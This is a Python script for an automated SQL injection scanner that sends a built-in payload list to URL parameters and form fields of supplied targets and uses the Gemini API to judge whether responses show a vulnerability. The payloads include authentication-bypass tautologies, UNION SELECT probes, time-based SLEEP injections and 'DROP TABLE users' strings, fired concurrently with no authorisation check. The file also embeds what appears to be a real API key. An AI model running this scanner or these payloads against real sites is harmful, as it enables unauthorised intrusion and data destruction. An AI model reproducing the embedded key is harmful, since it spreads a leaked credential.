import os
import requests
import urllib.parse
import json
import time
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# SQL Injection payloads to test
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "') OR ('1'='1",
    "') OR ('1'='1' --",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT 1,2,3,4 --",
    "' UNION SELECT 1,2,3,4,5 --",
    "1; DROP TABLE users --",
    "1'; DROP TABLE users --",
    "' OR 1=1 LIMIT 1 --",
    "' AND 1=0 UNION SELECT 1,2,3,4,5 --",
    "' AND 1=1 --",
    "' AND 1=0 --",
    "' OR 'x'='x",
    "' AND 'x'='y",
    "' SLEEP(5) --",
    "' AND SLEEP(5) --",
    "' OR SLEEP(5) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
]

# Error patterns that might indicate SQL Injection vulnerability
SQL_ERROR_PATTERNS = [
    "SQL syntax",
    "mysql_fetch_array",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "mysqli_query",
    "mysqli_fetch",
    "mysqli_fetch_array",
    "mysqli_num_rows",
    "ORA-01756",
    "ORA-00933",
    "ORA-00942",
    "ORA-01789",
    "ORA-01840",
    "ORA-03113",
    "ORA-12154",
    "ODBC Driver",
    "Microsoft SQL Native Client",
    "SQLite3",
    "PostgreSQL",
    "SQLSTATE",
    "Microsoft JET Database",
    "Microsoft Access Driver",
    "Syntax error",
    "Unclosed quotation mark",
    "Incorrect syntax",
    "Unexpected end of SQL command",
    "Division by zero",
    "supplied argument is not a valid MySQL",
    "Column count doesn't match",
    "UNION ALL SELECT",
    "UNION SELECT",
    "SQL command not properly ended",
    "syntax to use near",
    "not a valid MySQL result",
    "valid PostgreSQL result",
    "unterminated quoted string",
    "You have an error in your SQL syntax",
]

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_with_params(file_path):
    """Extract URLs with parameters from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url and '?' in url:  # Make sure URL is not empty and has parameters
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    return urls

def check_for_sql_errors(response_text):
    """Check if the response contains SQL error messages."""
    for pattern in SQL_ERROR_PATTERNS:
        if pattern.lower() in response_text.lower():
            return True, pattern
    return False, None

def analyze_with_gemini(url, payload, response_content, original_content):
    """
    Use Gemini API to analyze if the SQL Injection payload is likely to be successful.
    """
    # First, check for common SQL error patterns
    has_error, error_pattern = check_for_sql_errors(response_content)
    if has_error:
        return True, f"VULNERABLE: SQL error detected: {error_pattern}"
    
    # Check for significant differences in response
    if len(response_content) != len(original_content) and abs(len(response_content) - len(original_content)) > 100:
        return True, f"VULNERABLE: Significant difference in response length ({len(response_content)} vs {len(original_content)})"
    
    # Use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this SQL Injection payload is likely to be successful based on the following response.
    
    URL: {url}
    Payload: {payload}
    
    Original Response Length: {len(original_content)}
    Modified Response Length: {len(response_content)}
    
    Modified Response (truncated if necessary):
    {response_content[:4000]}
    
    Please analyze if:
    1. There are any SQL error messages in the response
    2. The response shows signs of successful SQL injection (e.g., additional data, bypassed authentication)
    3. The response structure has changed significantly compared to a normal response
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def test_url_for_sqli(url):
    """Test a URL for SQL Injection vulnerabilities."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # Parse the URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # If no parameters in URL, try to find form fields
        if not query_params:
            try:
                print(f"No query parameters found, checking for forms in {url}")
                response = requests.get(url, headers=HEADERS, timeout=10)
                
                # Simple form field extraction
                form_fields = []
                if '<form' in response.text.lower():
                    # Extract input fields from forms
                    input_pattern = r'<input.*?name=["\']([^"\']+)["\']'
                    form_fields = re.findall(input_pattern, response.text, re.IGNORECASE)
                    
                    if form_fields:
                        print(f"Found {len(form_fields)} form fields: {', '.join(form_fields)}")
                        
                        # Test each form field with SQL injection payloads
                        for field in form_fields:
                            # First get a baseline response
                            normal_value = generate_random_string()
                            test_data = {field: normal_value}
                            
                            try:
                                normal_response = requests.post(url, data=test_data, headers=HEADERS, timeout=10)
                                normal_content = normal_response.text
                                
                                # Test SQL injection payloads
                                for payload in SQLI_PAYLOADS:
                                    sqli_data = {field: payload}
                                    sqli_response = requests.post(url, data=sqli_data, headers=HEADERS, timeout=10)
                                    
                                    # Check for SQL errors or other indicators
                                    has_error, error_pattern = check_for_sql_errors(sqli_response.text)
                                    
                                    if has_error:
                                        print(f"Potential SQL Injection found in form field {field} with payload {payload}")
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential SQL Injection Vulnerability (Form)',
                                            'analysis': f"SQL error detected: {error_pattern}"
                                        })
                                        break
                                    
                                    # If no obvious error, use Gemini for analysis
                                    is_vulnerable, explanation = analyze_with_gemini(url, payload, sqli_response.text, normal_content)
                                    
                                    if is_vulnerable:
                                        results.append({
                                            'url': url,
                                            'param': f"form:{field}",
                                            'payload': payload,
                                            'status': 'Potential SQL Injection Vulnerability (Form)',
                                            'analysis': explanation
                                        })
                                        break
                            except Exception as e:
                                print(f"Error testing form field {field}: {e}")
                                continue
            except Exception as e:
                print(f"Error checking for forms: {e}")
            
            return results
        
        # Test each parameter individually
        for param, values in query_params.items():
            print(f"Testing parameter: {param}")
            
            # Get a baseline response with a normal value
            normal_value = generate_random_string()
            test_params = {p: values[0] for p, values in query_params.items()}
            test_params[param] = normal_value
            test_url = f"{base_url}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                normal_response = requests.get(test_url, headers=HEADERS, timeout=10)
                normal_content = normal_response.text
                
                # Test SQL injection payloads
                for payload in SQLI_PAYLOADS:
                    sqli_params = {p: values[0] for p, values in query_params.items()}
                    sqli_params[param] = payload
                    sqli_url = f"{base_url}?{urllib.parse.urlencode(sqli_params, doseq=True)}"
                    
                    try:
                        sqli_response = requests.get(sqli_url, headers=HEADERS, timeout=10)
                        
                        # Check for SQL errors
                        has_error, error_pattern = check_for_sql_errors(sqli_response.text)
                        
                        if has_error:
                            print(f"Potential SQL Injection found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential SQL Injection Vulnerability',
                                'analysis': f"SQL error detected: {error_pattern}"
                            })
                            break
                        
                        # If no obvious error, check for time-based payloads
                        if "SLEEP" in payload or "BENCHMARK" in payload:
                            start_time = time.time()
                            time_response = requests.get(sqli_url, headers=HEADERS, timeout=15)
                            elapsed_time = time.time() - start_time
                            
                            if elapsed_time > 5:  # If response took more than 5 seconds
                                print(f"Potential time-based SQL Injection found in parameter {param}")
                                results.append({
                                    'url': url,
                                    'param': param,
                                    'payload': payload,
                                    'status': 'Potential Time-based SQL Injection',
                                    'analysis': f"Response time: {elapsed_time:.2f} seconds"
                                })
                                break
                        
                        # Use Gemini for more advanced analysis
                        is_vulnerable, explanation = analyze_with_gemini(sqli_url, payload, sqli_response.text, normal_content)
                        
                        if is_vulnerable:
                            print(f"Potential SQL Injection found in parameter {param} with payload {payload}")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential SQL Injection Vulnerability',
                                'analysis': explanation
                            })
                            break
                    except requests.Timeout:
                        # If we get a timeout on a SLEEP payload, it might be vulnerable
                        if "SLEEP" in payload or "BENCHMARK" in payload:
                            print(f"Potential time-based SQL Injection found in parameter {param} (request timed out)")
                            results.append({
                                'url': url,
                                'param': param,
                                'payload': payload,
                                'status': 'Potential Time-based SQL Injection',
                                'analysis': "Request timed out, which might indicate a successful time-based injection"
                            })
                            break
                    except Exception as e:
                        print(f"Error testing SQL injection payload: {e}")
                        continue
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")
        
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def scan_sqli(params_file_path, max_workers=3):
    """
    Scan URLs with parameters for SQL Injection vulnerabilities.
    
    Args:
        params_file_path: Path to the file containing URLs with parameters
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential SQL Injection vulnerabilities
    """
    if not os.path.exists(params_file_path):
        print(f"File not found: {params_file_path}")
        return []
    
    urls = extract_urls_with_params(params_file_path)
    if not urls:
        print("No URLs with parameters found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs with parameters to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_sqli, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(params_file_path)
    domain = os.path.basename(params_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_sqli_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("SQL Injection Vulnerability Scan Results\n")
            f.write("=======================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['param']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No SQL Injection vulnerabilities found.\n")
    
    return all_results

def test_specific_parameter(param_name, target_url=None):
    """Test a specific parameter for SQL Injection vulnerabilities."""
    if not target_url:
        target_url = "http://testphp.vulnweb.com/listproducts.php"
    
    url = f"{target_url}?{param_name}=1"
    print(f"Testing parameter '{param_name}' on URL: {url}")
    
    results = []
    
    try:
        # Get a baseline response
        normal_response = requests.get(url, headers=HEADERS, timeout=10)
        normal_content = normal_response.text
        
        # Test SQL injection payloads
        for payload in SQLI_PAYLOADS:
            sqli_url = f"{target_url}?{param_name}={urllib.parse.quote(payload)}"
            
            try:
                sqli_response = requests.get(sqli_url, headers=HEADERS, timeout=10)
                
                # Check for SQL errors
                has_error, error_pattern = check_for_sql_errors(sqli_response.text)
                
                if has_error:
                    print(f"Potential SQL Injection found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential SQL Injection Vulnerability',
                        'analysis': f"SQL error detected: {error_pattern}"
                    })
                    break
                
                # If no obvious error, use Gemini for analysis
                is_vulnerable, explanation = analyze_with_gemini(sqli_url, payload, sqli_response.text, normal_content)
                
                if is_vulnerable:
                    print(f"Potential SQL Injection found with payload {payload}")
                    results.append({
                        'url': target_url,
                        'param': param_name,
                        'payload': payload,
                        'status': 'Potential SQL Injection Vulnerability',
                        'analysis': explanation
                    })
                    break
            except Exception as e:
                print(f"Error testing SQL injection payload: {e}")
    
    except Exception as e:
        print(f"Error testing parameter: {e}")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct parameter test
        if '=' in file_path and not os.path.exists(file_path):
            param_name = file_path.split('=')[0]
            target_url = None
            if len(sys.argv) > 2:
                target_url = sys.argv[2]
            
            results = test_specific_parameter(param_name, target_url)
            
            if results:
                print(f"\nFound {len(results)} potential SQL Injection vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo SQL Injection vulnerabilities found.")
        else:
            print(f"Scanning file: {file_path}")
            results = scan_sqli(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential SQL Injection vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload']}")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo SQL Injection vulnerabilities found.")
    else:
        print("Usage: python sqli_test.py <path_to_params_file_or_parameter>")
        print("Examples:")
        print("  python sqli_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_params.txt")
        print("  python sqli_test.py cat=1 http://testphp.vulnweb.com/listproducts.php")